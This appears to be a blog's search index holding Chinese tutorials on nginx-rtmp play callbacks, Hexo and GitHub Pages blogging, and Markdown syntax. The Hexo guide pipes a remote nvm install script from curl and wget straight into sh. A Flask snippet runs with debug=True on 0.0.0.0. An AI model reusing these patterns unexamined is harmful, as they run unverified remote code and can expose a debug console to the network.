app.run(host='0.0.0.0',port=10078,debug=True)   播放权限也可用类似on_publish的验证方法进行控制。\non_play和on_publish 一样，只接受post方法，若需要接受get方法需要在rtmp中application的配置中添加notify_method get;，然后可在http{}部分中处理调用（这部分语法我不太清楚，不详细展开）。\n以下是nginx.conf关于on_play的用法\non_play 语法：on_play url 上下文：rtmp, server, application 描述：设置 HTTP 播放回调。每次一个客户分发播放命令时，一个 HTTP 请求异步发送，命令处理会挂起 - 直到它返回结果码。之后再解析 HTTP 结果码。\n  HTTP 2XX 返回码的话继续 RTMP 会话。\n  HTTP 3XX 返回码的话 重定向 RTMP 到另一个流，这个流的名字在 HTTP 返回头的 Location 获取。如果新流的名字起始于 rtmp:// 然后远程 relay 会被创建。relay 要求 IP 地址是指定的而不是域名，并且只工作在 1.3.10 版本以上的 nginx。另请参考 notify_relay_redirect。\n  其他返回码的话 RTMP 连接丢弃。 重定向例子：\n  http {\nlocation /local_redirect { rewrite ^.$ newname? permanent; } location /remote_redirect { # no domain name here, only ip rewrite ^.$ rtmp://192.168.1.123/someapp/somename? permanent; }\n}\nrtmp { application myapp1 { live on; # stream will be redirected to 'newname' on_play http://localhost:8080/local_redirect; } application myapp2 { live on; # stream will be pulled from remote location # requires nginx \u003e= 1.3.10 on_play http://localhost:8080/remote_redirect; }\n}\n HTTP 请求接收到一些个参数。在 application/x-www-form-urlencoded MIME 类型下使用 POST 方法。以下参数会被传送给调用者： * call=play。 * addr - 客户端 IP 地址。 * app - application 名。 * flashVer - 客户端 flash 版本。 * swfUrl - 客户端 swf url。 * tcUrl - tcUrl。 * pageUrl - 客户端页面 url。 * name - 流名。 出了上述参数之外其他所有播放命令参数显式地发送回调。例如如果一个流由 url rtmp://localhost/app/movie?a=100\u0026b=face\u0026foo=bar 访问，然后呢 a,b 和 foo 发送回调。 on_play http://example.com/my_callback; ## 过程中使用到的额外软件 * obs * 手机端:快直播 * ffmpeg推流（没用过） ","description":"","tags":["nginx","rtmp"],"title":"nginx+rtmp","uri":"/posts/nginx-rtmp/"},{"categories":["tech"],"content":"Hexo+gitPages 的博客多端同步管理及迁移  本文参考\n如何解决github+Hexo的博客多终端同步问题\n利用Hexo在多台电脑上提交和更新github pages博客\n搭建hexo博客并简单的实现多终端同步\nhexo博客同步管理及迁移\n 主体的思路是将博文内容相关文件放在Github项目中master中，将Hexo配置写博客用的相关文件(包括博客内容主题等等)放在Github项目的hexo分支上，这个是关键，多终端的同步只需要对分支hexo进行操作。\n同步的首次操作 在创建了博客的目录下操作，push本地文件夹Hexo中的必要文件到yourname.github.io的hexo分支上。\n只托管部分用于多终端的同步的文件\n注意：使用第三方主题时，要删除第三方主题的.git文件夹删除，不然无法push到远程仓库\n1 2 3 4 5 6 7  git init //初始化本地仓库 git add source //将必要的文件依次添加，有些文件夹如npm install产生的node_modules由于路径过长不好处理，所以这里没有用`git add .`命令了，而是依次添加必要文件，如下图所示,其实也可以用'git add .'命令，在.gitignore文件中加入不需要同步的文件即可 git commit -m \"Blog Source Hexo\" git branch hexo //新建hexo分支 git checkout hexo //切换到hexo分支上 git remote add origin git@github.com:yourname/yourname.github.io.git //将本地与Github项目对接 git push origin hexo //push到Github项目的hexo分支上   多出来的hexo的分支，用于文件同步，原有的master分支用于部署静态博客页面\n在新终端进行更新博客 先从github中把文件clone到本地，然后安装相应组件。然后通过git的提交同步内容，用hexo的命令部署博客到gitPages里。\n1 2 3 4 5 6 7 8 9  git clone -b hexo git@github.com:yourname/yourname.github.io.git //将Github中hexo分支clone到本地 cd yourname.github.io //切换到刚刚clone的文件夹内 npm install //注意，这里一定要切换到刚刚clone的文件夹内执行，安装必要的所需组件，不用再init hexo new post \"new blog name\" //新建一个.md文件，并编辑完成自己的博客内容 git add source //经测试每次只要更新sorcerer中的文件到Github中即可，因为只是新建了一篇新博客，如果更改了主题样式的话还是建议用'git add .' git commit -m \"XX\" git push origin hexo //更新分支 hexo d -g //push更新完分支之后将自己写的博客对接到自己搭的博客网站上，同时同步了Github中的master   已有博客的终端更新博客 进入相应的文件夹，更新博客直行命令即可。\n1 2 3 4 5 6  git pull origin hexo//先pull完成本地和远端的融合 hexo new post \"new blog\" git add . git commit -m \"Blog update\" git push origin hexo hexo d -g   ","description":"","tags":["hexo"],"title":"hexo+gitPages Synchronization","uri":"/posts/hexo-gitpages-synchronization/"},{"categories":["markdown"],"content":"Markdown Syntax  本文参考\nMarkdown基本语法(简书)\nMarkdown官方文档\nMarkdown语法html支持\nMarkdown部分详细用法\n  标题 Markdown 支持两种标题的语法，类 Setext 和类 atx 形式。\n1 2 3 4 5 6 7 8  Atx形式 # 这是一级标题 ## 这是二级标题 ### 这是三级标题 #### 这是四级标题 ##### 这是五级标题 ###### 这是六级标题   这是一级标题 这是二级标题 这是三级标题 这是四级标题 这是五级标题 这是六级标题 1 2 3 4 5 6 7  Setext形式 This is an H1 ============= This is an H2 -------------   This is an H1 This is an H2 根据标题生成目录 1  [TOC] 根据标题自动生成目录   [TOC]\n 字体 **这是加粗的文字** *这是倾斜的文字*` ***这是斜体加粗的文字*** ~~这是加删除线的文字~~ 加粗测试\n倾斜测试\n斜体加粗测试\n删除线测试\n 引用 \u003e这是引用的内容 \u003e\u003e这是引用的内容 \u003e\u003e\u003e多重引用 \u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e\u003e这是引用的内容  引用测试一\n 引用测试二\n 多重引用\n        引用测试\n            分割线 --- ---- *** ***** 只要三个以上就可以\n     图片引用 1 2 3 4  ![图片alt](图片地址 ''图片title'') 图片alt就是显示在图片下面的文字，相当于对图片内容的解释。 图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加   1 2  ![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/ u=702257389,1274025419\u0026fm=27\u0026gp=0.jpg \"区块链\")   插入带有链接的图片 1 2 3 4  [[图片上传失败...(image-f83b77-1542510791300)]](http://www.baidu.com){:target=\"_blank\"} // 内链式 [[图片上传失败...(image-4dc956-1542510791300)]][5]{:target=\"_blank\"} // 引用式 [5]: http://www.baidu.com   [图片上传失败...(image-f83b77-1542510791300)]{:target=\"_blank\"}\n内链式\n[图片上传失败...(image-f83b77-1542510791300)]{:target=\"blank\"}\n外链式\n 超链接引用 1 2  [超链接名](超链接地址 \"超链接title\") title可加可不加   1 2  [简书](http://jianshu.com) [百度](http://baidu.com)   baidu\n注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。\n\u003ca href=\"超链接地址\" target=\"_blank\"\u003e超链接名\u003c/a\u003e 示例 \u003ca href=\"https://www.jianshu.com/u/1f5ac0cf6a8b\" target=\"_blank\"\u003e简书\u003c/a\u003e 简书\n 视频插入 注：Markdown 语法是不支持直接插入视频的 普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法 第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面\n代码1 注：多数第三方平台不支持插入\u003ciframe\u003e视频\n1  \u003ciframe height=498 width=510 src='http://player.youku.com/embed/XMjgzNzM0NTYxNg==' frameborder=0 'allowfullscreen'\u003e\u003c/iframe\u003e   代码2\n1  [[图片上传失败...(image-49aefe-1542510791300)]](http://v.youku.com/v_show/id_XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A\u0026from=y1.3-tv-grid-1007-9910.86804.1-2#paction){:target=\"_blank\"}    列表 1 2 3 4 5 6 7  无序列表用任一种皆可 - 列表内容 + 列表内容 * 列表内容 注意：- + * 跟内容之间都要有一个空格    列表（-） 列表（-）   列表（+）   列表（*）  1 2 3 4 5 6 7  有序列表内容 1.列表内容 2.列表内容 3.列表内容 注意：序号跟内容之间要有空格    第一点 第二点 第三点  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  **上一级和下一级之间敲三个空格即可** - 一级无序列表内容 - 二级无序列表内容 - 二级无序列表内容 - 二级无序列表内容 - 一级无序列表内容 1. 二级有序列表内容 2. 二级有序列表内容 3. 二级有序列表内容 1. 一级有序列表内容 - 二级无序列表内容 - 二级无序列表内容 - 二级无序列表内容 2. 一级有序列表内容 1. 二级有序列表内容 2. 二级有序列表内容 3. 二级有序列表内容   上一级和下一级之间敲三个空格即可\n 一级无序列表内容  二级无序列表内容 二级无序列表内容 二级无序列表内容   一级无序列表内容  二级有序列表内容 二级有序列表内容 二级有序列表内容     一级有序列表内容  二级无序列表内容 二级无序列表内容 二级无序列表内容   一级有序列表内容  二级有序列表内容 二级有序列表内容 二级有序列表内容     表格 表头|表头|表头 ---|:--:|---: 内容|内容|内容 内容|内容|内容 第二行分割表头和内容。 - 有一个就行，为了对齐，多加了几个 文字默认居左 -两边加：表示文字居中 -右边加：表示文字居右 注：原生的语法两边都要用 | 包起来。此处省略 1 2 3 4 5  姓名|技能|排行 --|:--:|--: 刘备|哭|大哥 关羽|打|二哥 张飞|骂|三弟      姓名 技能 排行     刘备 哭 大哥   关羽 打 二哥   张飞 骂 三弟    Typora编辑器中可以直接使用crtl+T，或者在菜单段落中找到表格生成\n 代码引用 单行代码\n1  `代码内容`   int main(){return 0;}\n代码块\n1 2 3 4 5  (```)language 代码... 代码... 代码... (```)    注：为了防止转译，前后三个反引号处加了小括号，实际是没有的。这里只是用来演示，实际中去掉两边小括号即可。\n 1 2 3 4 5 6  #include\u003ciostream\u003eusing namespace std; int main(){ cout\u003c\u003c \"hello markdown\"; return 0; }   格式化代码html版 1 2 3 4  \u003cpre\u003e ## 这是一个不起作用的标题 \u003c/pre\u003e   ## 这是一个不起作用的标题  流程图 注：** st=\u003estart: 开始 的：后面保持空格**\n   形参 实参 含义     tag st 标签 (可以自定义)   =\u003e =\u003e 赋值   type start 类型 (6种类型)   content 开始 描述内容 (可以自定义)   :\u003eurl http://www.baidu.com[blank] 链接与跳转方式 兼容性很差       6种类型 含义     start 启动   end 结束   operation 程序   subroutine 子程序   condition 条件   inputoutput 输出       形参 实参 含义     -\u003e -\u003e 连接   condition c1 条件   (布尔值,方向) (yes,right) 如果满足向右连接，4种方向：right ，left，up ，down 默认为：down    注：operation (程序); subroutine (子程序) ;condition (条件)，都可以在括号里加入连接方向。\n1 2 3 4 5 6 7 8 9  ```flow st=\u003estart: 开始 op=\u003eoperation: My Operation cond=\u003econdition: Yes or No? e=\u003eend st-\u003eop-\u003econd cond(yes)-\u003ee cond(no)-\u003eop \u0026```   st=\u003estart: 开始 op=\u003eoperation: My Operation cond=\u003econdition: Yes or No? e=\u003eend st-\u003eop-\u003econd cond(yes)-\u003ee cond(no)-\u003eop \u0026``` 选项框 1 2 3 4  - [x] 选项一 - [ ] 选项二 需要注意的是：-、[x]、和选择一之间都要有空格，如果不下x[ ]中也要有空格    选项一 选项二   数学公式 支持LaTex的数学公式，参考https://www.jianshu.com/p/2bbec51d756f\n数学公式（MathJax)，参考https://www.jianshu.com/p/a0aa94ef8ab2\n注：1个$左对齐，2个居中\n1 2  $$ x \\href{why-equal.html}{=} y^2 + 1 $$ $ x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}. $   $$ x \\href{why-equal.html}{=} y^2 +1 $$\n使用Typora的时候可以直接使用 $$+回车，或者用crtl+shift+M生成公式块（在段落菜单中的公式块）\n参考https://blog.csdn.net/mingzhuo_126/article/details/82722455\n 脚注 1 2  Markdown[^1] [^1]: Markdown是一种纯文本标记语言 // 在文章最后面显示脚注   Markdown1\n 锚点 注：只有标题支持锚点， 跳转目录方括号后 保持空格\n1 2 3  [公式标题锚点](#1) ### [需要跳转的目录] {#1} // 方括号后保持空格   脚注标题锚点\n1 2 3  由于{# 是hexo的标注语言 hexo 中 {# 属于保留字段 {# ... #}属于注释字段 把```以外的{#改成{{ '{#' }}即可解决    自动邮箱链接 1  \u003cxxx@outlook.com\u003e   xxx@outlook.com\n 时序图 代码1\n​```sequence A-\u003e\u003eB: 你好 Note left of A: 我在左边 // 注释方向，只有左右，没有上下 Note right of B: 我在右边 B--\u003eA: 很高兴认识你 ​``` 演示\n代码详解\n注：A-\u003e\u003eB: 你好 后面可以不写文字，但是一定要在最后加上： Note left of A 代表注释在A的左边\n   符号 含义     - 实线   \u003e 实心箭头   -- 虚线   \u003e\u003e 空心箭头    代码2\n ```sequence 起床-\u003e吃饭: 稀饭油条 吃饭-\u003e上班: 不要迟到了 上班-\u003e午餐: 吃撑了 上班-\u003e下班: Note right of 下班: 下班了 下班-\u003e回家: Note right of 回家: 到家了 回家--\u003e\u003e起床: Note left of 起床: 新的一天 演示\n转义字符 由于markdown语法的原因，可以用\\进行转义。\n  markdown是一种纯文本标记语言 ↩︎\n   ","description":"","tags":["markdown"],"title":"Markdown Syntax","uri":"/posts/markdown-syntax/"},{"categories":["tech"],"content":"hexo+gitPages搭建个人博客  本文参考\nhexo 博客搭建\nhexo官方文档\n【持续更新】最全Hexo博客搭建+主题优化+插件配置+常用操作+错误分析\n手把手教你搭建自己的个人博客（图文教程）\n搭建篇 --使用Github+hexo搭建个人博客教程—总结自己爬过的坑\nGitHub+Hexo 搭建个人网站详细教程\n史上最详细的Hexo博客搭建图文教程\nhexo优化\nhexo博客改装和一些细节优化\nhttps://www.chakid.com/2018/05/26/hexo博客改装和一些细节优化\nHexo NexT 博客后台管理指南\nHexo主题更改以及小功能的添加\nhexo-NexT主题配置\nNexT官方展示\nNexT官方中文文档ReadME\nNexT源码\nNexT文档\nHexo的Next主题详细配置\nhexo的next主题个性化教程:打造炫酷网站\nhexo的next主题个性化教程：打造炫酷网站\n【持续更新】hexo next主题优化手册\n可参考博客嘤\nhttps://guanqr.com/tech/website/hexo-theme-next-customization/\nhttps://biqianhan-zidi.github.io/\nyilia主题\nyilia主题源码（GitHub）\nyilia主题展示\nhexo+gitpage优化：\nhttps://blog.lgf.im/2020/speedup-github-page.html\n hexo博客搭建 安装前提 安装 Hexo 相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序：\n Node.js (Should be at least nodejs 6.9) Git  如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。\n$ npm install -g hexo-cli 如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。\n如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。\n Mac 用户\n您在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 Preferences -\u003e Download -\u003e Command Line Tools -\u003e Install 安装命令行工具。\n 安装 Git   Windows：下载并安装 git.\n  Mac：使用 Homebrew, MacPorts ：brew install git;或下载 安装程序 安装。\n  Linux (Ubuntu, Debian)：sudo apt-get install git-core\n   Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core\n   Windows 用户\n由于众所周知的原因，从上面的链接下载git for windows最好挂上一个代理，否则下载速度十分缓慢。也可以参考这个页面，收录了存储于百度云的下载地址。\n 安装 Node.js 安装 Node.js 的最佳方式是使用 nvm。\ncURL:\n$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh Wget:\n$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh 安装完成后，重启终端并执行下列命令即可安装 Node.js。\n$ nvm install stable 或者您也可以下载 安装程序 来安装。\n Windows 用户\n对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选Add to PATH选项。 另外，您也可以使用Git Bash，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用Git Bash来进行操作。\n 安装 Hexo 所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。\n$ npm install -g hexo-cli 在安装的时候我用的是npm install hexo --save\n关于npm命令 回顾 npm install 命令 最近在写Node程序的时候，突然对 npm install 的-save和-save-dev 这两个参数的使用比较混乱。其实博主在这之前对这两个参数的理解也是模糊的，各种查资料和实践后对它们之间的异同点略有理解。遂写下这篇文章避免自己忘记，同时也给node猿友一点指引。\n我们在使用 npm install 安装模块的模块的时候 ，一般会使用下面这几种命令形式：\n1 2 3 4  npm install moduleName # 安装模块到项目目录下` npm install -g moduleName # -g 的意思是将模块安装到全局，具体安装到磁盘哪个位置，要看 npm config prefix 的位置。 npm install -save moduleName # -save 的意思是将模块安装到项目目录下，并在package文件的dependencies节点写入依赖。 npm install -save-dev moduleName # -save-dev 的意思是将模块安装到项目目录下，并在package文件的devDependencies节点写入依赖。   那么问题来了，在项目中我们应该使用四个命令中的哪个呢？这个就要视情况而定了。下面对这四个命令进行对比，看完后你就不再这么问了。\nnpm install moduleName 命令  安装模块到项目node_modules目录下。 不会将模块依赖写入devDependencies或dependencies 节点。 运行 npm install 初始化项目时不会下载模块。  npm install -g moduleName 命令  安装模块到全局，不会在项目node_modules目录中保存模块包。 不会将模块依赖写入devDependencies或dependencies 节点。 运行 npm install 初始化项目时不会下载模块。  npm install -save moduleName 命令  安装模块到项目node_modules目录下。 会将模块依赖写入dependencies 节点。 运行 npm install 初始化项目时，会将模块下载到项目目录下。 运行npm install --production或者注明NODE_ENV变量值为production时，会自动下载模块到node_modules目录中。  npm install -save-dev moduleName 命令  安装模块到项目node_modules目录下。 会将模块依赖写入devDependencies 节点。 运行 npm install 初始化项目时，会将模块下载到项目目录下。 运行npm install --production或者注明NODE_ENV变量值为production时，不会自动下载模块到node_modules目录中。  建站 安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。\n\u003cfolder\u003e 为hexo安装目录\n$ hexo init \u003cfolder\u003e $ cd \u003cfolder\u003e $ npm install 新建完成后，指定文件夹的目录如下：\n. ├── _config.yml ├── package.json ├── scaffolds ├── source | ├── _drafts | └── _posts └── themes _config.yml 网站的 配置 信息，您可以在此配置大部分的参数。\npackage.json 应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。\npackage.json{ \"name\": \"hexo-site\", \"version\": \"0.0.0\", \"private\": true, \"hexo\": { \"version\": \"\" }, \"dependencies\": { \"hexo\": \"^3.8.0\", \"hexo-generator-archive\": \"^0.1.5\", \"hexo-generator-category\": \"^0.1.3\", \"hexo-generator-index\": \"^0.2.1\", \"hexo-generator-tag\": \"^0.2.0\", \"hexo-renderer-ejs\": \"^0.3.1\", \"hexo-renderer-stylus\": \"^0.3.3\", \"hexo-renderer-marked\": \"^0.3.2\", \"hexo-server\": \"^0.3.3\" } } scaffolds 模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。\nHexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。\nsource 资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。\nthemes 主题 文件夹。Hexo 会根据主题来生成静态页面。\n配置 您可以在 _config.yml 中修改大部分的配置。\n ### 网站    参数 描述     title 网站标题   subtitle 网站副标题   description 网站描述   author 您的名字   language 网站使用的语言   timezone 网站时区。Hexo 默认使用您电脑的时区。时区列表。比如说：America/New_York, Japan, 和 UTC 。    其中，description主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。author参数用于主题显示文章的作者。\n网址    参数 描述 默认值     url 网址    root 网站根目录    permalink 文章的 永久链接 格式 :year/:month/:day/:title/   permalink_defaults 永久链接中各部分的默认值      网站存放在子目录\n如果您的网站存放在子目录中，例如 http://yoursite.com/blog，则请将您的 url设为 http://yoursite.com/blog 并把 root 设为 /blog/。\n 目录    参数 描述 默认值     source_dir 资源文件夹，这个文件夹用来存放内容。 source   public_dir 公共文件夹，这个文件夹用于存放生成的站点文件。 public   tag_dir 标签文件夹 tags   archive_dir 归档文件夹 archives   category_dir 分类文件夹 categories   code_dir Include code 文件夹 downloads/code   i18n_dir 国际化（i18n）文件夹 :lang   skip_render 跳过指定文件的渲染，您可使用 glob 表达式来匹配路径。      提示\n如果您刚刚开始接触Hexo，通常没有必要修改这一部分的值。\n 文章    参数 描述 默认值     new_post_name 新文章的文件名称 :title.md   default_layout 预设布局 post   auto_spacing 在中文和英文之间加入空格 false   titlecase 把标题转换为 title case false   external_link 在新标签中打开链接 true   filename_case 把文件名称转换为 (1) 小写或 (2) 大写 0   render_drafts 显示草稿 false   post_asset_folder 启动 Asset 文件夹 false   relative_link 把链接改为与根目录的相对位址 false   future 显示未来的文章 true   highlight 代码块的设置      相对地址\n默认情况下，Hexo生成的超链接都是绝对地址。例如，如果您的网站域名为example.com,您有一篇文章名为hello，那么绝对链接可能像这样：http://example.com/hello.html，它是绝对于域名的。相对链接像这样：/hello.html，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。\n 分类 \u0026 标签    参数 描述 默认值     default_category 默认分类 uncategorized   category_map 分类别名    tag_map 标签别名     日期 / 时间格式 Hexo 使用 Moment.js 来解析和显示时间。\n   参数 描述 默认值     date_format 日期格式 YYYY-MM-DD   time_format 时间格式 H:mm:ss    分页    参数 描述 默认值     per_page 每页显示的文章量 (0 = 关闭分页功能) 10   pagination_dir 分页目录 page    扩展    参数 描述     theme 当前主题名称。值为false时禁用主题   deploy 部署部分的设置    部署 当执行完npm install之后即可通过hexo s或者hexo serve通过本地访问hexo博客。\n此时博客已搭建在本地了。\n方案一：GithubPages   创建Github账号\n  创建仓库， 仓库名为：\u003cGithub账号名称\u003e.github.io\n  将本地Hexo博客推送到GithubPages\n3.1. 安装hexo-deployer-git插件。在命令行（即Git Bash）运行以下命令即可：\n$ npm install hexo-deployer-git --save 3.2. 添加SSH key。\n  创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可：\n$ ssh-keygen -t rsa -C \"邮箱地址\"   添加到 github。 复制密钥文件内容（路径形如C:\\Users\\Administrator\\.ssh\\id_rsa.pub），粘贴到New SSH Key即可。\n  测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You've successfully authenticated”即成功：\n$ ssh -T git@github.com $ yes   3.3. 修改_config.yml（在站点目录下）。文件末尾修改为：\n# Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repo: git@github.com:\u003cGithub账号名称\u003e/\u003cGithub账号名称\u003e.github.io.git branch: master 注意：上面仓库地址写ssh地址，不写http地址。\n3.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: git即成功推送：\n$ hexo g $ hexo d   等待1分钟左右，浏览器访问网址： https://\u003cGithub账号名称\u003e.github.io\n  至此，您的Hexo博客已经搭建在GithubPages, 域名为https://\u003cGithub账号名称\u003e.github.io。\n方案二：GithubPages + 域名 在方案一的基础上，添加自定义域名（您购买的域名）。\n  域名解析。\n类型选择为 CNAME；\n主机记录即域名前缀，填写为www；\n记录值填写为自定义域名；\n解析线路，TTL 默认即可。\n  仓库设置。\n2.1. 打开博客仓库设置：https://github.com/\u003cGithub账号名称\u003e/\u003cGithub账号名称\u003e.github.io/settings\n2.2. 在Custom domain下，填写自定义域名，点击save。\n2.3. 在站点目录的source文件夹下，创建并打开CNAME.txt，写入你的域名（如www.simon96.online），保存，并重命名为CNAME。\n  等待10分钟左右。\n浏览器访问自定义域名。\n至此，您的Hexo博客已经解析到自定义域名，https://\u003cGithub账号名称\u003e.github.io依然可用。\n（可在github仓库中设置跳转至个人域名）\n  绑定域名 虽然在Internet上可以访问我们的网站，但是网址是GitHub提供的:http://xxxx.github.io (知乎排版可能会出现\"http://\"字样) 而我们想使用我们自己的个性化域名，这就需要绑定我们自己的域名。这里演示的是在阿里云万网的域名绑定，在国内主流的域名代理厂商也就阿里云和腾讯云。登录到阿里云，进入管理控制台的域名列表，找到你的个性化域名，进入解析\n然后添加解析\n包括添加三条解析记录，192.30.252.153是GitHub的地址，你也可以ping你的 http://xxxx.github.io 的ip地址，填入进去。第三个记录类型是CNAME，CNAME的记录值是：你的用户名.http://github.io 这里千万别弄错了。第二步，登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名\n点击save保存。第三步，进入本地博客文件夹 ，进入blog/source目录下，创建一个记事本文件，输入你的域名，对，只要写进你自己的域名即可。如果带有www，那么以后访问的时候必须带有www完整的域名才可以访问，但如果不带有www，以后访问的时候带不带www都可以访问。所以建议，不要带有www。这里我还是写了www(不建议带有www):\n保存，命名为CNAME ，注意保存成所有文件而不是txt文件。\n完成这三步，进入blog目录中，按住shift键右击打开命令行，依次输入：\n1 2 3  hexo clean hexo g hexo d   这时候打开浏览器在地址栏输入你的个性化域名将会直接进入你自己搭建的网站。\n方案三：GithubPages + CodingPages + 域名 GithubPages 在国内较慢，百度不收录，而CodingPages 在国外较快。所以在方案二的基础上，添加CodingPages 。\n  创建Coding账号\n  创建仓库， 仓库名为：\u003cCoding账号名称\u003e\n  进入项目里『代码』页面，点击『一键开启静态 Pages』，稍等片刻CodingPages即可部署成功。\n  将本地Hexo博客推送到CodingPages\n4.1. 鉴于创建GithubPages 时，已经生成过公钥。可直接复制密钥文件内容（路径形如C:\\Users\\Administrator\\.ssh\\id_rsa.pub）， 粘贴到新增公钥。\n4.2. 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You've successfully authenticated”即成功：\n$ ssh -T git@git.coding.net $ yes 4.3. 修改_config.yml（在存放Hexo初始化文件的路径下）。文件末尾修改为：\n# Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: - type: git repo: git@github.com:\u003cGithub账号名称\u003e/\u003cGithub账号名称\u003e.github.io.git branch: master - type: git repo: git@git.dev.tencent.com:\u003cCoding账号名称\u003e/\u003cCoding账号名称\u003e.git branch: master 4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: git即成功推送：\n$ hexo g $ hexo d   域名解析\n  添加 CNAME 记录指向 \u003cCoding账号名称\u003e.coding.me\n类型选择为 CNAME；\n主机记录即域名前缀，填写为www；\n记录值填写为自定义域名；\n解析线路，TTL 默认即可。\n  添加 两条A 记录指向 192.30.252.153和192.30.252.154\n类型选择为 A；\n主机记录即域名前缀，填写为@；\n记录值填写为192.30.252.153和192.30.252.154；\n解析线路，境外或谷歌。\n  在『Pages 服务』设置页（https://dev.tencent.com/u/\u003cCoding账号名称\u003e/p/\u003cCoding账号名称\u003e/git/pages/settings）中绑定自定义域名。\n    至此，您的Hexo博客已经解析到自定义域名，https://\u003cGithub账号名称\u003e.github.io和https://\u003cCoding账号名称\u003e.coding.me依然可用。\n方案四：云服务器 + 域名 该方案需要先购买云服务器和域名。\n  在云服务器安装Git 和 Nginx。(Git 用于版本管理和部署，Nginx 用于静态博客托管。)\n登陆root用户，运行：\n$ yum -y update $ yum install -y git nginx   Nginx配置\n2.1. 创建文件目录(用于博客站点文件存放)\ncd /usr/local/ mkdir hexo chmod 775 -R /usr/local/hexo/ 2.2. 添加 index.html(用于检测配置 Nginx 是否成功)\nvim /usr/local/hexo/index.html 添加以下代码，并保存。\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003e\u003c/title\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003eNginx running\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 2.3. 配置 Nginx 服务器\nvim /etc/nginx/nginx.conf 修改server_name和root：\nserver { listen 80 default_server; listen [::]:80 default_server; server_name www.baidu.com; # 填个人域名 root /usr/local/hexo/; } 2.4. 启动nginx服务；\nservice nginx start 2.5. 云服务器浏览器访问个人域名或IP，若跳转index.html，则配置完成，否则检查以上配置。\n  git配置\n3.1. 创建文件目录, 用于私人 Git 仓库搭建, 并更改目录读写权限。\ncd /usr/local/ mkdir hexoRepo chmod 775 -R /usr/local/hexoRepo/ 3.2. Git 初始化裸库。\ncd hexoRepo/ git init --bare hexo.git 3.3. 创建 Git 钩子(hook)。\nvim /usr/local/hexoRepo/hexo.git/hooks/post-receive 3.4. 输入以下信息，用于指定 Git 的源代码 和 Git 配置文件。\n#!/bin/bash git --work-tree=/usr/local/hexo --git-dir=/usr/local/hexoRepo/hexo.git checkout -f 3.5. 保存并退出后, 给该文件添加可执行权限。\nchmod +x /usr/local/hexoRepo/hexo.git/hooks/post-receive   本地博客推送到云服务器\n4.1. 安装hexo-deployer-git插件。在命令行（即Git Bash）运行以下命令即可：\n$ npm install hexo-deployer-git --save 4.2. 添加SSH key。\n  创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可：\n$ ssh-keygen -t rsa -C \"邮箱地址\"   添加到 github。 复制密钥文件内容（路径形如C:\\Users\\Administrator\\.ssh\\id_rsa.pub），粘贴到New SSH Key即可。\n  测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You've successfully authenticated”即成功：\n$ ssh -T git@github.com $ yes   4.3. 修改_config.yml（在站点目录下）。文件末尾修改为：\n# Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repo: root@xxx.xxx.xxx.xxx:/usr/local/hexoRepo/hexo //用户名@域名或 IP 地址:/usr/local/hexoRepo/hexo branch: master 注意：上面仓库地址写ssh地址，不写http地址。\n4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: git即成功推送：\n$ hexo g $ hexo d   等待1分钟左右，浏览器访问个人域名。\n至此，您的Hexo博客已经搭建在云服务器, 域名为个人域名。\n  Hexo常用命令 1 2 3 4 5 6 7 8 9  hexo new \"postName\" #新建文章 hexo new page \"pageName\" #新建页面 hexo clean #清除部署緩存 hexo n == hexo new 